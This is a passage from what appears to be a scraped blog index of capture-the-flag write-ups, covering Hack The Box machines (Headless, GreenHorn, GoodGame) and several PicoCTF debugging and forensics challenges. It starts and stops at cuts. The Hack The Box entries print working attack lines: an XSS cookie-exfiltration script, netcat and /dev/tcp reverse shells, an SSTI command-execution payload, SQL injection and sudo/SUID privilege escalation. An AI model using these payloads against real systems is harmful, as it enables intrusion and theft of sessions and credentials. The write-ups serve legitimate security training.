modified thing:User-Agent: &lt;script&gt;var i=new Image(); i.src=\"http://10.10.16.3:8000/?cookie=\"+btoa(document.cookie);&lt;/script&gt;This will show me admin cookiein my python server.Forward that and wait for second cookie:python3 -m http.server 8000Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...10.10.16.3 - - [07/Aug/2024 23:15:49] \"GET /?cookie=aXNfYWRtaW49SW5WelpYSWkudUFsbVhsVHZtOHZ5aWhqTmFQRFdudkJfWmZz HTTP/1.1\" 200 -10.10.11.8 - - [07/Aug/2024 23:16:26] \"GET /?cookie=aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA= HTTP/1.1\" 200 -This is the admin cookieencoded with base64. Decode it:$ echo \"aXNfYWRtaW49SW5WelpYSWkudUFsbVhsVHZtOHZ5aWhqTmFQRFdudkJfWmZz\" | base64 -d^C$ echo \"aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=\" | base64 -dis_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0Go to site and in inspect &gt; application &gt; cookiesmodify the is_admincookie with this:ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0.After that use gobuster dir for directory searching and you will find dashboard. With cookie already modified click Generate reportand with BurpSuite Intercept on Add the NetCatscript:date=2023-09-15;nc+10.10.16.3+1234+-e+/bin/bashThis will give me connection on nc -nlvp 1234:$ nc -nlvp 1234listening on [any] 1234 ...connect to [10.10.16.3] from (UNKNOWN) [10.10.11.8] 36136script /dev/null -c bashScript started, output log file is '/dev/null'.dvir@headless:~/app$ cat /home/dvir/user.txtc03dcd735ec55ef102130cbf0336ef6aUser Flag is : c03dcd735ec55ef102130cbf0336ef6a***Sudo -ltells me that i can run /usr/bin/syscheckwith rootpermission and i can also read it;#!/bin/bashif [ \"$EUID\" -ne 0 ]; then exit 1filast_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)formatted_time=$(/usr/bin/date -d \"@$last_modified_time\" +\"%d/%m/%Y %H:%M\")/usr/bin/echo \"Last Kernel Modification Time: $formatted_time\"disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')/usr/bin/echo \"Available disk space: $disk_space\"load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')/usr/bin/echo \"System load average: $load_average\"if ! /usr/bin/pgrep -x \"initdb.sh\" &amp;&gt;/dev/null; then /usr/bin/echo \"Database service is not running. Starting it...\" ./initdb.sh 2&gt;/dev/nullelse /usr/bin/echo \"Database service is running.\"fiexit 0In this code all we need is the last line of codes.if ! /usr/bin/pgrep -x \"initdb.sh\" &amp;&gt;/dev/null; then /usr/bin/echo \"Database service is not running. Starting it...\" ./initdb.sh 2&gt;/dev/nullelse /usr/bin/echo \"Database service is running.\"fiThis check if some database named initdb.shis running and if not it starts it in the same directory. ./ means in to run some file in current directoryDo this:nano initdb.sh#!/bin/bash/bin/bashThen make it executablechmod +x initdb.shAnd then execute the code.sudo /usr/bin/syscheckThis will start interactive bashshell where you will be rootand can read the flag.**Root Flag is : I deleted It :D**" }, { "title": "GreenHorn from HTB", "url": "/posts/GreenHorn-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "GreenHorn from HTBpageFirst lets go and scan the IP with nmap and we get this: nmap -sCV 10.10.11.25Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-29 13:57 +04Stats: 0:03:34 elapsed; 0 hosts completed (1 up), 1 undergoing Script ScanNSE Timing: About 99.05% done; ETC: 14:00 (0:00:00 remaining)Stats: 0:03:34 elapsed; 0 hosts completed (1 up), 1 undergoing Script ScanNSE Timing: About 99.05% done; ETC: 14:00 (0:00:00 remaining)Nmap scan report for greenhorn.htb (10.10.11.25)Host is up (0.35s latency).Not shown: 997 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|_ 256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)3000/tcp open ppp?| fingerprint-strings:| GenericLines, Help, RTSPRequest:| HTTP/1.1 400 Bad Request| Content-Type: text/plain; charset=utf-8| Connection: close| Request| GetRequest:| HTTP/1.0 200 OK| Cache-Control: max-age=0, private, must-revalidate, no-transform| Content-Type: text/html; charset=utf-8| Set-Cookie: i_like_gitea=5492b10992bb7ab5; Path=/; HttpOnly; SameSite=Lax| Set-Cookie: _csrf=GKYXdMU_Kco8L-vEsppzHOqkOFw6MTcyMjI0NzEzMDQ5ODczODk5NA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax| X-Frame-Options: SAMEORIGIN| Date: Mon, 29 Jul 2024 09:58:50 GMT| &lt;!DOCTYPE html&gt;| &lt;html lang=\"en-US\" class=\"theme-auto\"&gt;| &lt;head&gt;| &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt;| &lt;title&gt;GreenHorn&lt;/title&gt;| &lt;link rel=\"manifest\" href=\"data:application/json;base64,eyJuYW1lIjoiR3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYX| HTTPOptions:| HTTP/1.0 405 Method Not Allowed| Allow: HEAD| Allow: HEAD| Allow: GET| Cache-Control: max-age=0, private, must-revalidate, no-transform| Set-Cookie: i_like_gitea=f322deec042b8556; Path=/; HttpOnly; SameSite=Lax| Set-Cookie: _csrf=jTRtL2YEqVDsduob6tpm9L9AvCQ6MTcyMjI0NzEzNzU1MDQ4NzMyMg; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax| X-Frame-Options: SAMEORIGIN| Date: Mon, 29 Jul 2024 09:58:57 GMT|_ Content-Length: 01 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port3000-TCP:V=7.94SVN%I=7%D=7/29%Time=66A767DA%P=x86_64-pc-linux-gnu%rSF:(GenericLines,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\xSF:20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20BaSF:d\\x20Request\")%r(GetRequest,252E,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nCache-ContrSF:ol:\\x20max-age=0,\\x20private,\\x20must-revalidate,\\x20no-transform\\r\\nCoSF:ntent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nSet-Cookie:\\x20i_like_gitSF:ea=5492b10992bb7ab5;\\x20Path=/;\\x20HttpOnly;\\x20SameSite=Lax\\r\\nSet-CooSF:kie:\\x20_csrf=GKYXdMU_Kco8L-vEsppzHOqkOFw6MTcyMjI0NzEzMDQ5ODczODk5NA;\\xSF:20Path=/;\\x20Max-Age=86400;\\x20HttpOnly;\\x20SameSite=Lax\\r\\nX-Frame-OptSF:ions:\\x20SAMEORIGIN\\r\\nDate:\\x20Mon,\\x2029\\x20Jul\\x202024\\x2009:58:50\\xSF:20GMT\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\x20lang=\\\"en-US\\\"\\x20class=\\\"theSF:me-auto\\\"&gt;\\n&lt;head&gt;\\n\\t&lt;meta\\x20name=\\\"viewport\\\"\\x20content=\\\"width=devSF:ice-width,\\x20initial-scale=1\\\"&gt;\\n\\t&lt;title&gt;GreenHorn&lt;/title&gt;\\n\\t&lt;link\\xSF:20rel=\\\"manifest\\\"\\x20href=\\\"data:application/json;base64,eyJuYW1lIjoiRSF:3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6SF:Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmhSF:vcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCSF:JzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYSF:X\")%r(Help,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20tSF:ext/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\xSF:20Request\")%r(HTTPOptions,1A4,\"HTTP/1\\.0\\x20405\\x20Method\\x20Not\\x20AllSF:owed\\r\\nAllow:\\x20HEAD\\r\\nAllow:\\x20HEAD\\r\\nAllow:\\x20GET\\r\\nCache-ContSF:rol:\\x20max-age=0,\\x20private,\\x20must-revalidate,\\x20no-transform\\r\\nSSF:et-Cookie:\\x20i_like_gitea=f322deec042b8556;\\x20Path=/;\\x20HttpOnly;\\x2SF:0SameSite=Lax\\r\\nSet-Cookie:\\x20_csrf=jTRtL2YEqVDsduob6tpm9L9AvCQ6MTcyMSF:jI0NzEzNzU1MDQ4NzMyMg;\\x20Path=/;\\x20Max-Age=86400;\\x20HttpOnly;\\x20SamSF:eSite=Lax\\r\\nX-Frame-Options:\\x20SAMEORIGIN\\r\\nDate:\\x20Mon,\\x2029\\x20JSF:ul\\x202024\\x2009:58:57\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n\")%r(RTSPRSF:equest,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/SF:plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20ReSF:quest\");Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 253.20 secondsAs you see there is 80 and 8000port open so it’s a site. That means we have to add the IP and the site name to /etc/hostsfile.127.0.0.1\tlocalhost127.0.1.1\tdarkfears31.giorgi\tdarkfears31# The following lines are desirable for IPv6 capable hosts::1 localhost ip6-localhost ip6-loopbackff02::1 ip6-allnodesff02::2 ip6-allrouters10.10.11.25 greenhorn.htbAfter that go to browser and access the site : greenhorn.htb. that means we are on 80port and there is link on the bottom of the page which leads us to ?login.php and we need the password to access it.**maybe use hydra on it, i don’t know i didn’t try it, ATP i can’t access to the site i don’t know why.**To find the password go to greenhorn.htb:8000where we will find the password.go to explore and there is repository. In there go to this directory and this file:data--&gt;settings--&gt;pass.php&lt;?php$ww = 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163';?&gt;This is the password for the Junior. Go to crackstation and enter the hash. you will get the password: iloveyou1. you can close the site you will not need it after this.Go to the main site and log in with this password. The site is on pluck 4.7.18after searching exploits on this version i learnt that i needed to upload php-reverse-shell.phpin .zip file after going to install modulespage.nc -nlvp 1234to get the connection after uploading the .zipfile.After uploading we get the connection and we need to run this code because nc -nlvp 1234listening on [any] 1234 ...connect to [10.10.16.9] from (UNKNOWN) [10.10.11.25] 55670Linux greenhorn 5.15.0-113-generic #123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux 10:06:06 up 5 min, 0 users, load average: 0.00, 0.06, 0.03USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can't access tty; job control turned offof this. The code is: python3 -c 'import pty;pty.spawn(\"/bin/bash\")'www-data@greenhorn:/$Then we need to login as user named junior. So run the:www-data@greenhorn:/home/junior$ su juniorsu juniorPassword: iloveyou1After this in Juniors directory we can read the user.txt:junior@greenhorn:~$ cat user.txtcat user.txt3663c5ef34958f2ac0a5787db46c8576This is the first flag.Also there is the Using OpenVAS.pdf. There is valuable information there so we need to get this file into our PC, for that we will use the:junior@greenhorn:~$ mv 'Using OpenVAS.pdf' openvas.pdfjunior@greenhorn:~$ python3 -m http.serverinto that directory and from our PC-s terminal we will use the:$ wget greenhorn.htb/openvas.pdfThere is pixelated password as image so we need to extract it with this:$ pdfimages -png openvas.pdf output.png![[output.png-000.png]]For that we will use the Depixfrom github:$ git clone https://github.com/spipm/Depix.gitthere is code written in Git that we will use to get the password for root:python3 depix.py-p ~/output.png-000.png \\-s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png \\-o output.pngthis will give us the normal .pngfile with password:![[output.png]]The password is:sidefromsidetheothersidesidefromsidetheothersideThen go to NetCatand then login as root with this:junior@greenhorn:~$ su rootsu rootPassword: sidefromsidetheothersidesidefromsidetheothersideafter that go to Root-shome directory and catthe root.txt to get the root flag:root@greenhorn:~# lslscleanup.sh restart.sh root.txtroot@greenhorn:~# cat root.txtcat root.txtab4ea6c7e33b1184fc85dc81689155aa" }, { "title": "GoodGame from HTB", "url": "/posts/Goodgame-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "GoodGame from HTBnmapshowed:PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.51|_http-title: GoodGames | Community and Store|_http-server-header: Werkzeug/2.0.2 Python/3.9.2Site runs on werkzeugsame as flask so maybe we’ll have to use sstiadd this to /etc/hosts10.10.11.130 goodgame.htbAccess the site and on top left there is login button. Click thatturn on burpsuite + interceptand type in whatever you want. In burpsuiteyou need to modify payload like:email=admin' or 1=1 -- - &amp;password=This will get you logged inThen you can see emailwhich is admin@goodgames.htbwe’‘ll have to find what is passwordwith sqlmapafter enumerating and finding this is the last code for sqlmapsqlmap -r goodgame.req -D main -T user --dumpgoodgame.reqis burpsuite payloadPOST /login HTTP/1.1Host: goodgame.htbContent-Length: 40Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://goodgame.htbContent-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8Sec-GPC: 1Accept-Language: en-US,en;q=0.5Referer: http://goodgame.htb/Accept-Encoding: gzip, deflate, brConnection: keep-aliveemail=admin@goodgames.htb&amp;password=adminOn top left there is settingslogo which redirects you to subdomain. Add that to /etc/hosts10.10.11.130 internal-administration.goodgames.htbThen access it.Go to settingsand it’s time for ssti. Change name to ``if name will be 49this means sstiworks and we will need to get reverse-shell. It works/Now will have to push in base64payload because normal things didn’t work for me like uploading reverse shell and executing it, etcecho -ne 'bash -i &gt;&amp; /dev/tcp/&lt;your_port&gt;/&lt;port&gt; 0&gt;&amp;1' | base64{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}&lt;your_base64_payload&gt;${IFS}|base64${IFS}-d|bash').read()}}After that you will get connection on netcat**User Flag is: 4e2c8d476534e7d6a3cd3969e3b2f1cf**You will be root but you are in docker.remember if you are root in docker you can always do privilege escalationdrwxr-xr-x 2 1000 1000 4096 Dec 2 2021 .drwxr-xr-x 1 root root 4096 Nov 5 2021 ..lrwxrwxrwx 1 root root 9 Nov 3 2021 .bash_history -&gt; /dev/null-rw-r--r-- 1 1000 1000 220 Oct 19 2021 .bash_logout-rw-r--r-- 1 1000 1000 3526 Oct 19 2021 .bashrc-rw-r--r-- 1 1000 1000 807 Oct 19 2021 .profile-rw-r----- 1 root 1000 33 Aug 17 16:54 user.txtthat 1000indicates that we are in dockermount/dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)This confirms that.ss -tlnp---------------------------------LISTEN 0 128 172.19.0.1:22 0.0.0.0:* users:((\"sshd\",pid=1403,fd=3))--------------------------------This means sshis running internallyget another connection or just create another shell-like idk what to call itin that listener.Then connect to sshas augustuswith same password as rootifconfigeth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 172.19.0.2 netmask 255.255.0.0 broadcast 172.19.255.255 ether 02:42:ac:13:00:02 txqueuelen 0 (Ethernet) RX packets 2313 bytes 405545 (396.0 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 1934 bytes 2082199 (1.9 MiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0With this we know that we’ll have to connect to 172.19.0.1 in sshscript /dev/null -c bashScript started, file is /dev/nullssh augustus@172.19.0.1augustus@172.19.0.1's password: superadministratoraugustus@GoodGames:~$Then copy /bin/bashto home directory and in other connection where you are rootgive it root euidaugustus@GoodGames:~$ exitroot@3a453ab39d3d:/home/augustus# chown root:root bashroot@3a453ab39d3d:/home/augustus# chmod 4755 bashThen go to sshand execute ./bashand become root like this:augustus@GoodGames:~$ ./bash -pbash-5.1# ididuid=1000(augustus) gid=1000(augustus) euid=0(root) groups=1000(augustus)Root Flag is: 7f0f9e85759eacd8102d1525227a3b12***" }, { "title": "GDB baby step 4 from PicoCTF", "url": "/posts/GDB-baby-step-4-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "GDB baby step 4 from PicoCTFpage Descriptionmain calls a function that multiplies eax by a constant. The flag for this challenge is that constant in decimal base. If the constant you find is 0x1000, the flag will be picoCTF{4096}.Debug this.First make file executable: chmod +x debugger0_dGo to gdb and examine how file works. During examining of the main function we see that it calls &lt;func1&gt; and we have to find the number it gives, so we have to follow that &lt;func1&gt;. We’‘ll use:Step-in --&gt; siStep-over --&gt; nidon’t forget to use this:(gdb) layout asmtype run and then nipress entertill you reach this: 0x0000000000401142 &lt;+38&gt;:\tcall 0x401106 &lt;func1&gt;Then use Step-into follow the &lt;func1&gt;:There is the imulcontaining our hex we are searching for: 0x3269.(gdb) print/d 0x3269\t$1 = 12905And that’s the flag:picoCTF{12905}" }, { "title": "GDB baby step 3 from PicoCTF", "url": "/posts/GDB-baby-step-3-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "GDB baby step 3 from PicoCTFpage DescriptionNow for something a little different. 0x2262c96b is loaded into memory in the main function. Examine byte-wise the memory that the constant is loaded in by using the GDB command x/4xb addr. The flag is the four bytes as they are stored in memory. If you find the bytes 0x11 0x22 0x33 0x44 in the memory location, your flag would be: picoCTF{0x11223344}.Debug this. HintsYou’ll need to breakpoint the instruction after the memory load.Use the gdb command x/4xb addr with the memory location as the address addr to examine.First make the file executable:chmod +x debugger0_cThen go to gdb and examine.(gdb) disas mainDump of assembler code for function main: 0x0000000000401106 &lt;+0&gt;:\tendbr64 0x000000000040110a &lt;+4&gt;:\tpush %rbp 0x000000000040110b &lt;+5&gt;:\tmov %rsp,%rbp 0x000000000040110e &lt;+8&gt;:\tmov %edi,-0x14(%rbp) 0x0000000000401111 &lt;+11&gt;: mov %rsi,-0x20(%rbp) 0x0000000000401115 &lt;+15&gt;: movl $0x2262c96b,-0x4(%rbp) 0x000000000040111c &lt;+22&gt;: mov -0x4(%rbp),%eax 0x000000000040111f &lt;+25&gt;: pop %rbp 0x0000000000401120 &lt;+26&gt;: retmovl $0x2262c96b, -0x4(%rbp): Moves the immediate value 0x2262c96b into the memory location at RBP minus 0x4 (4 bytes below the current base pointer). Note the use of movl, which indicates moving a 32-bit value.***mov -0x4(%rbp), %eax: Moves the 32-bit value at the memory location RBP minus 0x4 into the EAX register. This effectively loads the immediate value previously stored at -0x4(%rbp) into EAX.***For better look at how file runs lets go to assembly layout:(gdb) layout asmFrom hints we have to set breakpoint after the memory load which will be on 0x000000000040111f.(gdb) b *0x000000000040111fThis will set the new breakpoint and type cso the debugging will continue. Program will stop on the new breakpoint and we will be able to examine the memory.*And there is the flag:**picoCTF{0x6bc96222}" }, { "title": "GDB baby step 2 from PicoCTF", "url": "/posts/GDB-baby-step-2-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "GDB baby step 2 from PicoCTFpage DescriptionCan you figure out what is in the eax register at the end of the main function? Put your answer in the picoCTF flag format: picoCTF{n} where n is the contents of the eax register in the decimal number base. If the answer was 0x11 your flag would be picoCTF{17}.Debug this. HintsYou could calculate eax yourself, or you could set a breakpoint for after the calculcation and inspect eax to let the program do the heavy-lifting for you.First make file executablechmod +x debugger0_bThen open the file in the gdband then read info functions.use the asm layout to see how the program works and where it stops:first breakpoint is at 0x40110b because of that program can’t read the %eax so from the hints we have to set another breakpoint after the 0x401141 function at the 0x401142 - retfunction:b *0x401142This will set the new breakpoint. Run the program and when it stops click c for it to continue till it reaches second breakpoint. After that you can use:print/d $eaxWith this you will print eax in decimal with the help of /dand you will get the decimal.*The flag is:**picoCTF{307019}" }, { "title": "GDB baby step 1 from PicoCTF", "url": "/posts/GDB-baby-step-1-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "GDB baby step 1 from PicoCTFpage DescriptionCan you figure out what is in the eax register at the end of the main function? Put your answer in the picoCTF flag format: picoCTF{n} where n is the contents of the eax register in the decimal number base. If the answer was 0x11 your flag would be picoCTF{17}.Disassemble this. Hintsmain is actually a recognized symbol that can be used with gdb commands.Let’s open this file in gdb and dissasemble the main to see what is in the eaxregister:$ gdb -q(gdb) file ./debugger0_a Reading symbols from ./debugger0_a...(No debugging symbols found in ./debugger0_a)(gdb) info functionsAll defined functions:Non-debugging symbols:0x0000000000001000 _init0x0000000000001030 __cxa_finalize@plt0x0000000000001040 _start0x0000000000001070 deregister_tm_clones0x00000000000010a0 register_tm_clones0x00000000000010e0 __do_global_dtors_aux0x0000000000001120 frame_dummy0x0000000000001129 main0x0000000000001140 __libc_csu_init0x00000000000011b0 __libc_csu_fini0x00000000000011b8 _fini(gdb) disas mainDump of assembler code for function main: 0x0000000000001129 &lt;+0&gt;:\tendbr64 0x000000000000112d &lt;+4&gt;:\tpush %rbp 0x000000000000112e &lt;+5&gt;:\tmov %rsp,%rbp 0x0000000000001131 &lt;+8&gt;:\tmov %edi,-0x4(%rbp) 0x0000000000001134 &lt;+11&gt;:\tmov %rsi,-0x10(%rbp) 0x0000000000001138 &lt;+15&gt;:\tmov $0x86342,%eax 0x000000000000113d &lt;+20&gt;:\tpop %rbp 0x000000000000113e &lt;+21&gt;:\tretEnd of assembler dump.Take the 0x86342 from $0x86342,%eaxand convert the hex to decimal to get the flag:picoCTF{549698}" }, { "title": "forky from PicoCTF", "url": "/posts/Forky-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "forky from PicoCTFpage DescriptionIn this program, identify the last integer value that is passed as parameter to the function doNothing(). HintsWhat happens when you fork? The flag is picoCTF{IntegerYouFound}. For example, if you found that the last integer passed was 1234, the flag would be picoCTF{1234}Let’s run vuln inghidra and see the function:undefined4 main(void){ int *piVar1; piVar1 = (int *)mmap((void *)0x0,4,3,0x21,-1,0); *piVar1 = 1000000000; fork(); fork(); fork(); fork(); *piVar1 = *piVar1 + 0x499602d2; doNothing(*piVar1); return 0;}Best explanation to what fork does:fork (); // Line 1fork (); // Line 2fork (); // Line 3 L1 // There will be 1 child process / \\ // created by line 1. L2 L2 // There will be 2 child processes / \\ / \\ // created by line 2L3 L3 L3 L3 // There will be 4 child processes // created by line 3Total Number of Processes = 2^n, where n is the number of fork system calls.So the thing is last input that will be in doNothing(*piVar1) will be: \\(1000000000 + 16*0x499602d2\\)Let’s convert 1000000000 to hex with this site: 3B9ACA00 –&gt; 0x3B9ACA00.In C compiler type this code:#include &lt;stdio.h&gt; int main() { int result = 0x3B9ACA00 + 16 * 0x499602d2; printf(\"%d/n\", result); return 0;}this will give output of: -721750240So the flag will be:picoCTF{-721750240v}" }, { "title": "FindAndOpen from PicoCTF", "url": "/posts/FindAndOpen-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "FindAndOpen from PicoCTFpage DescriptionSomeone might have hidden the password in the trace file.Find the key to unlock this file. This tracefile might be good to analyze.So download the .pcap and search for the encrypted password and its located it: This is base64 encoded strings which needs to be added some letters to work:$ echo \"aaAABBHHPJGTFRLKVGhpcyBpcyB0aGUgc2VjcmV0OiBwaWNvQ1RGe1IzNERJTkdfTE9LZF8=\" | base64 -di��&lt;���This is the secret: picoCTF{R34DING_LOKd_Enter this as password of .zipfile and you will get the flag:picoCTF{R34DING_LOKd_fil56_succ3ss_c2e6d949}" }, { "title": "File types from PicoCTF", "url": "/posts/File-types-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "File types from PicoCTFpage #DescriptionContentsThis file was found among some files marked confidential but my pdf reader cannot read it, maybe yours can.You can download the file from here.giorgi@darkfears31:~/Desktop/picoctf$ ls Flag.pdfgiorgi@darkfears31:~/Desktop/picoctf$ file Flag.pdf Flag.pdf: shell archive textgiorgi@darkfears31:~/Desktop/picoctf$ sh Flag.pdfx - created lock directory _sh00046.x - extracting flag (text)x - removed lock directory _sh00046.giorgi@darkfears31:~/Desktop/picoctf$ lsFlag.pdf flaggiorgi@darkfears31:~/Desktop/picoctf$ file flagflag: current ar archivegiorgi@darkfears31:~/Desktop/picoctf$ ar x flaggiorgi@darkfears31:~/Desktop/picoctf$ lsFlag.pdf flaggiorgi@darkfears31:~/Desktop/picoctf$ file flagflag: cpio archive; device 234, inode 37435, mode 100644, uid 0, gid 0, modified Thu Mar 16 01:40:19 2023, 510 bytes \"flag\"giorgi@darkfears31:~/Desktop/picoctf$ mkdir cpio &amp;&amp; cpio -i -D cpio &lt; flag &amp;&amp; cd cpio2 blocksgiorgi@darkfears31:~/Desktop/picoctf/cpio$ lsflaggiorgi@darkfears31:~/Desktop/picoctf/cpio$ file flagflag: bzip2 compressed data, block size = 900k giorgi@darkfears31:~/Desktop/picoctf/cpio$ bzip2 -d flagbzip2: Can't guess original name for flag -- using flag.outgiorgi@darkfears31:~/Desktop/picoctf/cpio$ lsflag.outgiorgi@darkfears31:~/Desktop/picoctf/cpio$ file flag.out flag.out: gzip compressed data, was \"flag\", last modified: Thu Mar 16 01:40:19 2023, from Unix, original size modulo 2^32 328giorgi@darkfears31:~/Desktop/picoctf/cpio$ mv flag.out flag.gzgiorgi@darkfears31:~/Desktop/picoctf/cpio$ gzip -d flag.gzgiorgi@darkfears31:~/Desktop/picoctf/cpio$ lsflaggiorgi@darkfears31:~/Desktop/picoctf/cpio$ file flagflag: lzip compressed data, version: 1giorgi@darkfears31:~/Desktop/picoctf/cpio$ lzip -d flaggiorgi@darkfears31:~/Desktop/picoctf/cpio$ lsflag.outgiorgi@darkfears31:~/Desktop/picoctf/cpio$ file flag.out flag.out: LZ4 compressed data (v1.4+)giorgi@darkfears31:~/Desktop/picoctf/cpio$ mv flag.out flag.lz4giorgi@darkfears31:~/Desktop/picoctf/cpio$ lz4 -d flag.lz4 Decoding file flag flag.lz4 : decoded 264 bytes giorgi@darkfears31:~/Desktop/picoctf/cpio$ lsflag flag.lz4lz4 flag.lz4Decoding file flag flag already exists; do you want to overwrite (y/N) ? yflag.lz4 : decoded 264 bytes giorgi@darkfears31:~/Desktop/picoctf/cpio$ lsflag flag.lz4giorgi@darkfears31:~/Desktop/picoctf/cpio$ file flagflag: LZMA compressed data, non-streamed, size 253giorgi@darkfears31:~/Desktop/picoctf/cpio$ lzma -d flaglzma: flag: Filename has an unknown suffix, skippinggiorgi@darkfears31:~/Desktop/picoctf/cpio$ mv flag flag.lzmagiorgi@darkfears31:~/Desktop/picoctf/cpio$ lsflag.lz4 flag.lzmagiorgi@darkfears31:~/Desktop/picoctf/cpio$ lzma -d flag.lzmagiorgi@darkfears31:~/Desktop/picoctf/cpio$ lsflag flag.lz4giorgi@darkfears31:~/Desktop/picoctf/cpio$ file flagflag: lzop compressed data - version 1.040, LZO1X-1, os: Unixgiorgi@darkfears31:~/Desktop/picoctf/cpio$ mv flag flag.lzopgiorgi@darkfears31:~/Desktop/picoctf/cpio$ lzop -d flag.lzopgiorgi@darkfears31:~/Desktop/picoctf/cpio$ lsflag flag.lz4 flag.lzopgiorgi@darkfears31:~/Desktop/picoctf/cpio$ file flagflag: lzip compressed data, version: 1giorgi@darkfears31:~/Desktop/picoctf/cpio$ lzip -d flaggiorgi@darkfears31:~/Desktop/picoctf/cpio$ lsflag.lz4 flag.lzop flag.outgiorgi@darkfears31:~/Desktop/picoctf/cpio$ file flag.outflag.out: XZ compressed data, checksum CRC64giorgi@darkfears31:~/Desktop/picoctf/cpio$ mv flag.out flag.xzgiorgi@darkfears31:~/Desktop/picoctf/cpio$ xz -d flag.xzgiorgi@darkfears31:~/Desktop/picoctf/cpio$ lsflag flag.lz4 flag.lzopgiorgi@darkfears31:~/Desktop/picoctf/cpio$ file flag flag: ASCII textgiorgi@darkfears31:~/Desktop/picoctf/cpio$ cat 